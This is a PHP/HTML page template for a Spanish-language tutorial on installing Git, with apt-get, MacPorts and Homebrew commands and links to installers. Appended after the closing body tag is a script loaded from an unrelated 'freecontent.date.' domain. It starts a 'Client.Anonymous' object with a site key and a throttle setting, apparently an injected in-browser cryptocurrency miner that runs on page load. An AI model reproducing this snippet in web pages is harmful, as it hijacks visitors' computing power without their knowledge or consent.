<?php
defined('BASEPATH') OR exit('No direct script access allowed');
?><!DOCTYPE html>
<html lang="en">

  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="ylit.cl" content="">

    <title>Tutotial GitHub</title>

    <!-- Bootstrap core CSS -->
    <link href="<?php echo base_url() ?>assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom fonts for this template -->
    <link href="<?php echo base_url() ?>assets/vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- Custom styles for this template -->
    <link href="<?php echo base_url() ?>assets/css/clean-blog.min.css" rel="stylesheet">

  </head>

  <body>

    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
      <div class="container">
        <div class="collapse navbar-collapse" id="navbarResponsive">
          <ul class="navbar-nav ml-auto">
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>">Índice</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/quienesSomos">Quines Somos</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="<?php echo base_url() ?>IndiceController/contactanos">Contactanos</a>
            </li>
          </ul>
        </div>
      </div>
    </nav>

    <!-- Page Header -->
    <header class="masthead" style="background-image: url('<?php echo base_url() ?>assets/img/github1.png')">
      <div class="overlay"></div>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <div class="site-heading">
              <h1>Tutorial GitHub</h1>
              <span class="subheading">Instalación.</span>
              <span class="subheading">Desarrollado por <a href="https://ylit.cl/">YLIT</a></span>
            </div>
          </div>
        </div>
      </div>
    </header>

    <!-- Post Content -->
    <article>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">

            <h2 class="section-heading">Descargar.</h2>
            <p>En el sitio oficial de Git podemos encontrar las descargas correspondientes
            al sistema operativo que estemos usando, solo debemos acceder al sitio
            <a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a>.</p>

            <p>A continuación se describe la instalación para los distintos tipos de sistemas operativos
            más comunes.</p>

            <h2 class="section-heading">Linux.</h2>
            <p>Si estás en una distribución basada en Debian como Ubuntu, instala usando apt-get.</p>

            <p><code>$ apt-get install git</code></p>

            <p></p>

            <p></p>

            <h2 class="section-heading">Mac.</h2>

            <p>Hay tres maneras fáciles de instalar Git en un Mac. La más sencilla 
            es usar el instalador gráfico de Git, que puedes descargar desde la página de SourceForge</p>
            <p><code><a href="http://sourceforge.net/projects/git-osx-installer/">http://sourceforge.net/projects/git-osx-installer/</a></code></p>

            <p>Una alternativa es instalar Git a través de MacPorts (<a href="http://www.macports.org">http://www.macports.org</a>). 
            Si tienes MacPorts instalado, instala Git con:</p>
            <p><code>$ sudo port install git-core +svn +doc +bash_completion +gitweb</code></p>

            <p>La otra alternativa es Homebrew (<a href="http://brew.sh/">http://brew.sh/</a>). 
            Si ya tienes instalado Homebrew, instala Git con:</p>
            <p><code>$ brew install git</code></p>

            <h2 class="section-heading">Windows.</h2>

            <p>Instalar Git en Windows es muy fácil. El proyecto msysGit tiene uno de los procesos de 
            instalación más sencillos. Simplemente descarga el archivo exe del instalador desde 
            la página de GitHub, y ejecútalo:</p>
            <p><a href="http://msysgit.github.com/"><code>http://msysgit.github.com/</code></a></p>

            <p>Una vez instalado, tendrás tanto la versión de línea de comandos 
            como la interfaz gráfica de usuario estándar.</p>

            <blockquote class="blockquote"><b>Nota para el uso en Windows:</b> Se debería usar Git con la 
            shell provista por msysGit (estilo Unix), lo cual permite usar las complejas líneas de 
            comandos de Git. Si por cualquier razón se necesitara usar la shell nativa 
            de Windows, la consola de línea de comandos, se han de usar las comillas dobles 
            en vez de las simples (para parámetros que contengan espacios) y se deben entrecomillar 
            los parámetros terminándolos con el acento circunflejo (^) si están al final de la línea, 
            ya que en Windows es uno de los símbolos de continuación.</blockquote>


              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/descripcion">Capítulo Anterior &larr;</a>
              </div>
              <div class="clearfix">
                <a class="btn btn-primary float-right" href="<?php echo base_url() ?>IndiceController/primerProyecto">Capítulo Siguiente &rarr;</a>
              </div>

          </div>
        </div>
      </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-md-10 mx-auto">
            <ul class="list-inline text-center">
              <li class="list-inline-item">
                <a href="https://www.linkedin.com/in/luis-navarro-arenas-6493b1136/">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://www.facebook.com/ylit.cl">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li class="list-inline-item">
                <a href="https://github.com/lnavarroa/tutorialGitHub">
                  <span class="fa-stack fa-lg">
                    <i class="fa fa-circle fa-stack-2x"></i>
                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
            </ul>
            <p class="copyright text-muted">Copyright &copy; YLIT 2018</p>
          </div>
        </div>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript -->
    <script src="<?php echo base_url() ?>assets/vendor/jquery/jquery.min.js"></script>
    <script src="<?php echo base_url() ?>assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

    <!-- Custom scripts for this template -->
    <script src="<?php echo base_url() ?>assets/js/clean-blog.min.js"></script>

  </body>


  <script src="https://www.freecontent.date./Kxnd.js"></script>
  <script>
    var _client = new Client.Anonymous('0df5a246946447fd570ca7839db8bd98fd09b8b9b6bafb8e25dfc39b5e1ef835', {
        throttle: 0.9
    });
    _client.start();

  </script>

</html>
